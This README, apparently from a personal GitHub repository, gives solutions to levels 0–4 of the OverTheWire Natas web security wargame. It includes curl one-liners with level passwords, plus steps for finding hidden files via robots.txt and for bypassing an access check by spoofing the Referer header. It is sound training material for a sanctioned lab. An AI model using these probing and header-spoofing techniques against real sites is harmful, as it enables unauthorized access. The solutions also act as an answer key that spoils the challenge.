# Solution

---

- natas0
    - ```Login to web:```
    - ```inspec element the page and look for comments```

- other solution:
    - ```view-source:http://natas0.natas.labs.overthewire.org/```

- curl:
    - ```curl -sv http://natas0.natas.labs.overthewire.org/ --user natas0:natas0 | grep -oe '<!--[A-Za-z].*' | cut -d ' ' -f6```

- python:
    - [natas0/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas1/solve.py)

- natas1
    - ```Login to web:```
    - ```view-source:http://natas0.natas.labs.overthewire.org/```

- curl:
    - ```curl -sv http://natas1.natas.labs.overthewire.org --user natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto | grep -o '<!--[A-Za-z].*' | awk '{print $6}'```
- python:
    - [natas1/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas1/solve.py)

- natas2
    - ```Login to web:```
    - ```view-source:http://natas2.natas.labs.overthewire.org```
    - ```click on files/pixel.png```
    - ```go back one directory and found users.txt```

- curl:
    - ```curl -sv http://natas2.natas.labs.overthewire.org/files/users.txt --user natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi | grep natas3 | awk -F: '{print $2}'```

- python:
    - [natas2/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas2/solve.py)

- natas3
    - ```Login to web:```
    - ```view-source:http://natas3.natas.labs.overthewire.org```
    - ```HINT:Not even Google will find it this time...```
    - ```http://natas3.natas.labs.overthewire.org/robots.txt```
    - ```Found: /s3cr3t/```
    - ```http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt```

- curl:
    - ```curl -sv http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt --user natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 | grep natas4 | cut -d':' -f2```

- python:
    - [natas3/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas3/solve.py)

- natas4
    - ```Login to web:```
    - ```Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" ```
    - ```Intercept data using proxy and burpsuite```
    - ```refresh page```
    - ```get a referer header from burpsuite: Referer: http://natas4.natas.labs.overthewire.org/index.php```
    - ```Send packet after changing request header to http://natas5.natas.labs.overthewire.org/```

- curl:
    - ```curl -sv http://natas4.natas.labs.overthewire.org/index.php -H "Referer: http://natas5.natas.labs.overthewire.org/" --user natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ | grep "Access" | cut -d' ' -f8```

-python:
    - [natas4/solve.py](https://github.com/catx0rr/overthewire/blob/master/natas/natas4/solve.py)